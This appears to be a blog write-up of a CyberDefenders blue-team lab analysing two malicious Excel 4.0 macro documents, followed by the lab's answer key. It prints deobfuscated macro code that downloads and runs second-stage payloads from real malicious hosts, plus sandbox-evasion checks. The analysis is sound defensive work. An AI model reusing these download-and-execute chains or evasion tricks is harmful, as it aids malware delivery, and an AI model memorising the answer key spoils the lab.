---
layout:	post
title:  "XLM Macros"
date:   2025-11-04 02:11:01 +0200
image: /images/2025-11-04-XLM-Macros/XLM_Macros.png
categories: [CyberDefenders, Malware Analysis]
tags: [cyberdefenders]
---

---

**Challenge Link:** [XLM Macros](https://cyberdefenders.org/blueteam-ctf-challenges/xlm-macros/)

<br>

## Scenario:

**Instructions**
- Uncompress the lab (pass: **cyberdefenders.org**)
- Zip sha256: 35fb4497de1633d6887fd1453ee1426ca627eeec
- Zip size: 74 KB

**Scenario**  
Recently, we have seen a resurgence of Excel-based malicous office documents. However, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you, as a security blue team analyst will get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack.

**Samples**
- Sample1: MD5: fb5ed444ddc37d748639f624397cff2a
- Sample2: MD5: b5d469a07709b5ca6fee934b1e5e8e38

<br>

## Analysis:

### Sample 1

To begin the analysis, the challenge file `sample1-fb5ed444ddc37d748639f624397cff2a.bin` was examined with `file` command, where it was found to be a Microsoft Excel.

```bash
file sample1-fb5ed444ddc37d748639f624397cff2a.bin 
sample1-fb5ed444ddc37d748639f624397cff2a.bin: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.2, Code page: 1252, Name of Creating Application: Microsoft Excel, Create Time/Date: Wed Apr  1 12:48:22 2020, Last Saved Time/Date: Thu Apr  2 13:21:34 2020, Security: 
```

Lets check if it contains any macros using `oleid`:

```bash
$ oleid sample1-fb5ed444ddc37d748639f624397cff2a.bin 

oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: sample1-fb5ed444ddc37d748639f624397cff2a.bin
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Excel 97-2003    |info      |                          
                    |Workbook or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Excel     |info      |Application name declared 
                    |                    |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Encrypted           |True                |low       |The file is encrypted. It 
                    |                    |          |may be decrypted with     
                    |                    |          |msoffcrypto-tool          
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |This file does not contain
                    |                    |          |VBA macros.               
--------------------+--------------------+----------+--------------------------
XLM Macros          |Yes                 |Medium    |This file contains XLM    
                    |                    |          |macros. Use olevba to     
                    |                    |          |analyse them.             
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```

The above output revealed that the workbook is encrypted and contains XLM macro. We will get back to encryption part during decoding.

Lets look more into this document under `LibreOffice`:

![Visible Sheets](/images/2025-11-04-XLM-Macros/1.png)

Three visible sheets, `Sheet1`, `Sheet2` and `Sheet3` can be seen above. However, threat actors normally hide the malicious sheets to prevent immediate discovery. Lets check for hidden sheet by navigating to:
`Right click on Sheet tab => Show Sheet...`

![Hidden Sheets](/images/2025-11-04-XLM-Macros/2.png)

It revealed six hidden sheets: `SOCWNEScLLxkLhtJp`, `OHqYbvYcqmWjJJjsF`, `Macro2`, `Macro3`, `Macro4` and `Macro5`.

Upon checking one of the hidden sheet, following can be seen:

![Hidden Sheet](/images/2025-11-04-XLM-Macros/3.png)

The sheet contains instructions in different cells, where values in one cell reference and execute values from another cell and so on. This creates cell-based command chaining making it obfuscated. 

Lets try to decode it. From the `oleid` output, we know the workbook is encrypted. Although `olevba` tool can analyze encrypted document without requiring decryption, but the `xlmdeobfuscator` tool require decrypting the workbook.

Lets decrypt this document using `msoffcrypto-crack` by brute forcing.

```bash
$ msoffcrypto-crack.py sample1-fb5ed444ddc37d748639f624397cff2a.bin 

Password found: VelvetSweatshop
```

The password was found to be `VelvetSweatshop`. The document was then decrypted using `msoffcrypto-tool` and saved as `sample1.bin`.

```bash
$ msoffcrypto-tool -p VelvetSweatshop sample1-fb5ed444ddc37d748639f624397cff2a.bin sample1.bin
```

The decrypted file `sample1.bin` was then processed using `xlmdeobfuscator`: 

```bash
xlmdeobfuscator -f sample1.bin 
```

Alternatively, `olevba` can be used directly on the encrypted file `sample1-fb5ed444ddc37d748639f624397cff2a.bin`:

```bash
$ olevba sample1-fb5ed444ddc37d748639f624397cff2a.bin
```

Regardless of the technique followed, both tool dump the same de-obfuscated macro content, as shown below:

```bash
' CELL:DW1337    , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\jhbtqNj\IOKVYnJ",0)
' CELL:DW1338    , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exRUN(SOCWNEScLLxkLhtJp!DW1337)","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",0,0)
' CELL:DW1339    , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",,0,0)
' CELL:DW1340    , End                 , HALT()
```

- It creates a new directory `C:\jhbtqNj\IOKVYnJ` via `CreateDirectoryA`.
- It calls `URLDownloadToFileA` to download next stager from `http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exRUN(...)` and saves it as `KUdYCRk.exe` in the created directory. It then executes the next stager by calling `ShellExecuteA`.

<br>

### Sample 2

To begin the analysis, the challenge file `sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin` was examined with `file` command, where it was found to be a Microsoft Excel.

```bash
$ file sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin 

sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Comments: ZNrQUl11Jl6jcYBb4wu, Name of Creating Application: Microsoft Excel, Create Time/Date: Thu Feb 27 10:23:09 2020, Last Saved Time/Date: Mon Mar 30 13:27:59 2020, Security: 0
```

Lets check if it contains any macros using `oleid`:

```bash
$ oleid sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin 

oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
SHRFMLA (sub): 0 0 1 8 6
SHRFMLA (sub): 9 9 1 8 8
SHRFMLA (sub): 19 19 1 7 7
SHRFMLA (sub): 26 26 0 7 8
SHRFMLA (sub): 0 0 1 8 6
SHRFMLA (sub): 9 9 1 8 8
SHRFMLA (sub): 19 19 1 7 7
SHRFMLA (sub): 26 26 0 7 8
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Excel 97-2003    |info      |                          
                    |Workbook or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Excel     |info      |Application name declared 
                    |                    |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |This file does not contain
                    |                    |          |VBA macros.               
--------------------+--------------------+----------+--------------------------
XLM Macros          |Yes                 |Medium    |This file contains XLM    
                    |                    |          |macros. Use olevba to     
                    |                    |          |analyse them.             
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```

The above output revealed that it contains XLM macro.

Lets look more into this document under `LibreOffice`:

![Visible Sheets](/images/2025-11-04-XLM-Macros/4.png)

One visible sheet, `Sheet1` can be seen above. However, threat actors normally hide the malicious sheets to prevent immediate discovery. Lets check for hidden sheet by navigating to:
`Right click on Sheet tab => Show Sheet...`

![Visible Sheets](/images/2025-11-04-XLM-Macros/5.png)

It revealed a hidden sheets, `CSHykdYHvi`.

Lets try to de-obfuscate the macro using `olevba`:

```bash
$ olevba sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin 

' EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:
' CELL:J727      , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\Windows\system32\reg.exe","EXPORT HKCU\Software\Microsoft\Office\GET.WORKSPACE(2)\Excel\Security c:\users\public\1.reg /y",0,5)
' CELL:J728      , PartialEvaluation   , =WAIT("45965.49200231481500:00:03")
' CELL:J729      , FullEvaluation      , FOPEN("c:\users\public\1.reg",1)
' CELL:J730      , PartialEvaluation   , =FPOS(FOPEN("c:\users\public\1.reg",1),215)
' CELL:J732      , PartialEvaluation   , =FCLOSE(FOPEN("c:\users\public\1.reg",1))
' CELL:J733      , PartialEvaluation   , =FILE.DELETE("c:\users\public\1.reg")
' CELL:J734      , Branching           , IF(ISNUMBER(SEARCH("0001",J731)),CLOSE(FALSE),GOTO(J1))
' CELL:J734      , FullEvaluation      , [FALSE] GOTO(J1)
' CELL:J1        , FullEvaluation      , FORMULA("=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)",K2)
' CELL:J2        , FullEvaluation      , FORMULA("=IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)",K4)
' CELL:J4        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(GET.WORKSPACE(19),,CLOSE(TRUE))",K5)
' CELL:J5        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(GET.WORKSPACE(42),,CLOSE(TRUE))",K6)
' CELL:J6        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(ISNUMBER(SEARCH(""Windows"",GET.WORKSPACE(1))), ,CLOSE(TRUE))",K7)
' CELL:J7        , FullEvaluation      , FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ethelenecrace.xyz/fbb3"",""c:\Users\Public\bmjn5ef.html"",0,0)",K8)
' CELL:J8        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1ALERT(""The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt."",2)",K9)
' CELL:J9        , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\bmjn5ef.html,DllRegisterServer"",0,5)",K11)
' CELL:J11       , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1CLOSE(FALSE)",K12)
' CELL:J12       , PartialEvaluation   , =WORKBOOK.HIDE("CSHykdYHvi",TRUE)
' CELL:J13       , FullEvaluation      , GOTO(K2)
' CELL:K2        , FullEvaluation      , IF(GET.WORKSPACE(13)<770,CLOSE(FALSE),)
' CELL:K4        , FullEvaluation      , IF(GET.WORKSPACE(14)<381,CLOSE(FALSE),)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|open                |May open a file                              |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|VBAWarnings         |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://ethelenecrac|URL                                          |
|          |e.xyz/fbb3          |                                             |
|IOC       |1.reg               |Executable file name                         |
|IOC       |reg.exe             |Executable file name                         |
|IOC       |rundll32.exe        |Executable file name                         |
|Hex String|HY7P                |48593750                                     |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+
```

At J727, it calls `ShellExecuteA` to executes `reg.exe` and exports the `HKCU\Software\Microsoft\Office\GET.WORKSPACE(2)\Excel\Security` to `c:\users\public\1.reg`. 
- The [GET.WORKSPACE(2)](https://malware.news/t/excel-4-macros-get-workspace-reference/38892) returns the Microsoft Excel version.

At J729, It opens the exported `1.reg` file. 

At J734, it searches for `0x0001` value inside the exported `1.reg` file. 
- If it found it, it exits.
- Otherwise, it jumps to J1.

Checking the `olevba` output summary, we can see the `VBAWarnings` registry key. The above check `0x0001` corresponds to `VBAWarnings = 1` (all macros enable), which is common in sandbox environment.

At J1, it checks if the workspace width is more than 770 by calling [GET.WORKSPACE(13)](https://malware.news/t/excel-4-macros-get-workspace-reference/38892), otherwise it exits.

At J2, it checks if the workspace height is more than 381 by calling [GET.WORKSPACE(14)](https://malware.news/t/excel-4-macros-get-workspace-reference/38892), otherwise it exits.

At J4, it checks if a mouse is preset by calling [GET.WORKSPACE(19)](https://malware.news/t/excel-4-macros-get-workspace-reference/38892), otherwise it exits.

At J5, it checks if the computer can play sound by calling [GET.WORKSPACE(42)](https://malware.news/t/excel-4-macros-get-workspace-reference/38892), otherwise it exits.

At J6, it checks if the environment running is Windows by calling [GET.WORKSPACE(1)](https://malware.news/t/excel-4-macros-get-workspace-reference/38892) and checking the `Windows` string, otherwise it exits.

At J7, it calls `URLDownloadToFileA` to download next stager from `https://ethelenecrace.xyz/fbb3` and save it as `c:\Users\Public\bmjn5ef.html`.

At J8, it shows an error message `The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt`.

At J9, it calls `ShellExecuteA` to executes `rundll32.exe`, which  executes the downloaded `1bmjn5ef.html` with the `DLLRegisterServer` export function. The use of `rundll32.exe` with export function `DLLRegisterServer` indicates the downloaded next stager `1bmjn5ef.html` is a DLL.

At J11, it hides the `CSHykdYHvi` sheet by calling `WORKBOOK.HIDE()`.

<br>

## Questions:

**Sample1: What is the document decryption password?**
<details>
  <summary>Show Answer</summary>
  <code>VelvetSweatshop</code>
</details>

<br>

**Sample1: This document contains six hidden sheets. What are their names? Provide the value of the one starting with S.**
<details>
  <summary>Show Answer</summary>
  <code>SOCWNEScLLxkLhtJp</code>
</details>

<br>

**Sample1: What URL is the malware using to download the next stage? Only include the second-level and top-level domain. For example, xyz.com.**
<details>
  <summary>Show Answer</summary>
  <code>http://rilaer.com</code>
</details>

<br>

**Sample1: What malware family was this document attempting to drop?**
<details>
  <summary>Show Answer</summary>
  <code>dridex</code>
  <br>
  Found signature in <a href="https://bazaar.abuse.ch/sample/7103c9d1c2a64b80a4b69e3d91487b602fd4ede836722fa9c0daf4fe09a2b7cd/">Malware Bazaar</a> via Google dorking the IoC: <code>intext:"rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi"</code>
</details>

<br>

**Sample2: This document has a very hidden sheet. What is the name of this sheet?**
<details>
  <summary>Show Answer</summary>
  <code>CSHykdYHvi</code>
</details>

<br>

**Sample2: This document uses reg.exe. What registry key is it checking?**
<details>
  <summary>Show Answer</summary>
  <code>VBAWarnings</code>
</details>

<br>

**Sample2: From the use of reg.exe, what value of the assessed key indicates a sandbox environment?**
<details>
  <summary>Show Answer</summary>
  <code>0x1</code>
</details>

<br>

**Sample2: This document performs several additional anti-analysis checks. What Excel 4 macro function does it use?**
<details>
  <summary>Show Answer</summary>
  <code>Get.Workspace</code>
</details>

<br>

**Sample2: This document checks for the name of the environment in which Excel is running. What value is it using to compare?**
<details>
  <summary>Show Answer</summary>
  <code>Windows</code>
</details>

<br>

**Sample2: What type of payload is downloaded?**
<details>
  <summary>Show Answer</summary>
  <code>DLL</code>
</details>

<br>

**Sample2: What URL does the malware download the payload from?**
<details>
  <summary>Show Answer</summary>
  <code>https://ethelenecrace.xyz/fbb3</code>
</details>

<br>

**Sample2: What is the filename that the payload is saved as?**
<details>
  <summary>Show Answer</summary>
  <code>bmjn5ef.html</code>
</details>

<br>

**Sample2: How is the payload executed? For example, mshta.exe**
<details>
  <summary>Show Answer</summary>
  <code>rundll32.exe</code>
</details>

<br>

**Sample2: What was the malware family?**
<details>
  <summary>Show Answer</summary>
  <code>zloader</code>
  <br>
  Checking the hash in <a href="https://bazaar.abuse.ch/sample/7103c9d1c2a64b80a4b69e3d91487b602fd4ede836722fa9c0daf4fe09a2b7cd/">Virus Total</a>, some antivirus engine flag it as zloader.
</details>

<br>

---